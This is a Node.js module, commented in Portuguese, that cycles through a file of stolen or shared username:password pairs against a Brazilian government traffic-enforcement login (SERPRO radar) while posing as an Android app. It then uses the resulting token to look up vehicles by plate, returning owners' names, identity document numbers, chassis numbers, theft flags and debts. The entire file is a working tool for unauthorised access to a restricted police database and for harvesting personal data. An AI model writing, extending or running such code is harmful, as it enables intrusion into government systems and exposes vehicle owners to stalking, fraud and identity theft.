const fs = require('fs');
const axios = require('axios');

const CAMINHO_TOKEN = './token-serpro.json';
const CAMINHO_LOGINS = './listaserpro.txt';

function salvarToken(token) {
  fs.writeFileSync(CAMINHO_TOKEN, JSON.stringify({ token }));
}

function lerTokenSalvo() {
  if (!fs.existsSync(CAMINHO_TOKEN)) return null;
  try {
    const json = JSON.parse(fs.readFileSync(CAMINHO_TOKEN));
    return typeof json.token === 'string' ? json.token : null;
  } catch {
    apagarToken();
    return null;
  }
}

function apagarToken() {
  if (fs.existsSync(CAMINHO_TOKEN)) fs.unlinkSync(CAMINHO_TOKEN);
}

function lerListaLogins() {
  if (!fs.existsSync(CAMINHO_LOGINS)) return [];
  return fs.readFileSync(CAMINHO_LOGINS, 'utf-8')
    .split('\n')
    .filter(Boolean)
    .map(l => l.trim())
    .filter(l => l.includes(':'))
    .map(l => {
      const [login, senha] = l.split(':');
      return { login, senha };
    });
}

function salvarListaLogins(lista) {
  const texto = lista.map(({ login, senha }) => `${login}:${senha}`).join('\n');
  fs.writeFileSync(CAMINHO_LOGINS, texto);
}

async function loginSerpro(username, password) {
  const payload = {
    imei: '',
    latitude: 0,
    longitude: 0,
    password,
    username
  };

  const headers = {
    'User-Agent': 'Dalvik/2.1.0 (Linux; Android 14)',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json'
  };

  try {
    const response = await axios.post(
      'https://radar.serpro.gov.br/core-rest/gip-rest/auth/loginTalonario',
      payload,
      { headers, timeout: 10000 }
    );

    console.log('📥 Response:', response.data);

    if (response.data?.token) return response.data.token;
    throw new Error('Token não retornado');
  } catch (err) {
    if (err.response) {
      console.log('📥 Response com erro:', err.response.data);
      throw new Error(`Erro HTTP ${err.response.status}`);
    } else if (err.request) {
      console.log('❌ Sem resposta da API (timeout ou rede)');
      throw new Error('Erro de conexão');
    } else {
      console.log('❌ Erro inesperado:', err.message);
      throw err;
    }
  }
}

async function obterNovoToken() {
  const lista = lerListaLogins();
  for (const credencial of lista) {
    console.log(`🔐 Testando login: ${credencial.login}`);
    try {
      const token = await loginSerpro(credencial.login, credencial.senha);
      console.log('📥 Response:', token);
      const novaLista = [credencial, ...lista.filter(l => l.login !== credencial.login)];
      salvarListaLogins(novaLista);
      salvarToken(token);
      console.log(`✅ Token obtido com sucesso com: ${credencial.login}`);
      return token;
    } catch (e) {
      console.log(`❌ Falha com ${credencial.login}: ${e.message}`);
    }
  }
  throw new Error('❌ Nenhum login válido encontrado');
}

async function getToken() {
  const token = lerTokenSalvo();
  if (token) return token;
  return await obterNovoToken();
}

function formatarResposta(d, debitoss) {
  return {
    veiculo: {
      placa: d.placa,
      chassi: d.chassi,
      renavam: d.codigoRenavam,
      situacao: d.situacao,
      tipo: d.descricaoTipoVeiculo,
      modelo: d.descricaoMarcaModelo,
      cor: d.descricaoCor,
      categoria: d.descricaoCategoria,
      anoModelo: d.anoModelo,
      anoFabricacao: d.anoFabricacao,
      combustivel: d.descricaoCombustivel,
      especie: d.descricaoEspecieVeiculo,
      carroceria: d.descricaoTipoCarroceria,
      procedencia: d.procedencia,
      potencia: d.potencia,
      cilindradas: d.cilindradas,
      qtdEixos: d.qtdEixos,
      lotacao: d.lotacao,
      numeroMotor: d.numeroMotor || null
    },
    proprietario: {
      nome: d.nomeProprietario,
      documento: d.numeroIdentificacaoProprietario,
      tipo: d.descricaoTipoProprietario,
      faturadoDocumento: d.numeroIdFaturamento,
      faturadoTipo: d.tipoDocFaturado
    },
    emplacamento: {
      municipio: d.descricaoMunicipioEmplacamento,
      uf: d.ufJurisdicao
    },
    importacao: {
      importador: d.numeroIdImportador || null,
      docImportador: d.descricaoDocImportador,
      paisTransferencia: d.descricaoPaisTransferencia,
      tipoImportacao: d.descricaoTipoImportacao || null,
      processo: d.numeroProcessoImportacao
    },
    restricoes: {
      restricao1: d.descricaoRestricao1,
      restricao2: d.descricaoRestricao2,
      restricao3: d.descricaoRestricao3,
      restricao4: d.descricaoRestricao4,
      renajud: d.indicadorRestricaoRenajud,
      rouboFurto: d.indicadorRouboFurto,
      leilao: d.indicadorLeilao
    },
    documentos: {
      dataEmissaoCrv: d.dataEmissaoCrv,
      crlvNumero: d.numeroCrlv || null,
      anoLicenciamentoPago: d.anoExercicioLicenciamentoPago || null
    },
    outros: {
      servicoConsultado: d.servicoConsultado,
      restricaoRfb: d.descricaoRestricaoRfb,
      comunicacaoVenda: d.indicadorComunicacaoVenda,
      pendenciaEmissao: d.indicadorPendenciaEmissao,
      alarme: d.indicadorAlarme,
      recall1: d.indicadorRecall1,
      recall2: d.indicadorRecall2,
      recall3: d.indicadorRecall3,
      recall4: d.indicadorRecall4
    },
    debitos: {
      chaveConsulta: debitoss.chaveConsulta ?? null,
      parteFixaTransacao: debitoss.parteFixaTransacao ?? null,
      codigoRetornoExecucao: debitoss.codigoRetornoExecucao ?? null,
      unico: debitoss.unico ?? null,
      codigoIdentificacaoVeiculo: debitoss.codigoIdentificacaoVeiculo ?? null,
      codigoCategoriaVeiculo: debitoss.codigoCategoriaVeiculo ?? null,
      codigosDebitos: {
        codigoDebitoIpvaLicenc: debitoss.codigoDebitoIpvaLicenc ?? null,
        codigoDebitoMultas: debitoss.codigoDebitoMultas ?? null
      },
      valoresDebitos: {
        valorDebitoIPVA: debitoss.valorDebitoIPVA ?? null,
        valorDebitoLicenciamento: debitoss.valorDebitoLicenciamento ?? null,
        valorDebitoMultas: debitoss.valorDebitoMultas ?? null,
        valorDebitoDPVAT: debitoss.valorDebitoDPVAT ?? null
      },
      caracteristicasVeiculo: {
        tipoRemarcacaoChassi: debitoss.tipoRemarcacaoChassi ?? null,
        tipoSituacaoVeiculo: debitoss.tipoSituacaoVeiculo ?? null,
        numeroEixoTraseiro: debitoss.numeroEixoTraseiro ?? null,
        numeroEixoAuxiliar: debitoss.numeroEixoAuxiliar ?? null,
        numeroEixos: debitoss.numeroEixos ?? null,
        cmtVeiculo: debitoss.cmtVeiculo ?? null,
        pbtVeiculo: debitoss.pbtVeiculo ?? null,
        capacidadeCarga: debitoss.capacidadeCarga ?? null,
        capacidadePassageiros: debitoss.capacidadePassageiros ?? null
      },
      localizacaoEDatas: {
        codigoMunicipioEmplacamento: debitoss.codigoMunicipioEmplacamento ?? null,
        dataLimiteRestricaoTributaria: debitoss.dataLimiteRestricaoTributaria ?? null,
        dataUltimaAtualizacao: debitoss.dataUltimaAtualizacao ?? null
      }
    },
    indicadores: {
      indicadorMultaRenainf: debitoss.indicadorMultaRenainf ?? null,
      indicadorComunicacaoVenda: debitoss.indicadorComunicacaoVenda ?? null,
      indicadorEmplacamentoEletronico: debitoss.indicadorEmplacamentoEletronico ?? null
    }
  };
}

async function consultarPlaca(placa, tentativas = 0) {
  placa = placa.toUpperCase().replace(/[^A-Z0-9]/g, '');
  if (!/^[A-Z]{3}[0-9A-Z]{4}$/.test(placa)) throw new Error('Placa inválida');
  if (tentativas > 1) throw new Error('Falha após renovar o token');

  let token;
  try {
    token = await getToken();
  } catch {
    apagarToken();
    token = await getToken();
  }

  const headers = {
    Authorization: token,
    'Accept-Encoding': 'gzip',
    'User-Agent': 'Dalvik/2.1.0 (Linux; Android 9)',
    Connection: 'Keep-Alive',
    Host: 'radar.serpro.gov.br'
  };

  const urlDados = `https://radar.serpro.gov.br/consultas-departamento-transito/api/veiculo/placa/${placa}`;

  try {
    const resDados = await axios.get(urlDados, { headers, timeout: 10000 });
    const d = resDados.data;
    if (!d || !d.placa) return { erro: 'Veículo não encontrado' };

    const urlDebitos = `https://radar.serpro.gov.br/core-rest/gip-rest/veiculos/${d.placa}/ufJurisdicao/${d.ufJurisdicao}/debito/`;
    let debitoss = {};
    try {
      const resDebito = await axios.get(urlDebitos, { headers, timeout: 10000 });
      debitoss = resDebito.data || {};
    } catch {
      debitoss = { erro: 'Erro ao obter débitos' };
    }

    return formatarResposta(d, debitoss);
  } catch (err) {
    if (err.response && [401, 403].includes(err.response.status)) {
      apagarToken();
      return await consultarPlaca(placa, tentativas + 1);
    }
    throw err;
  }
}

module.exports = { consultarPlaca };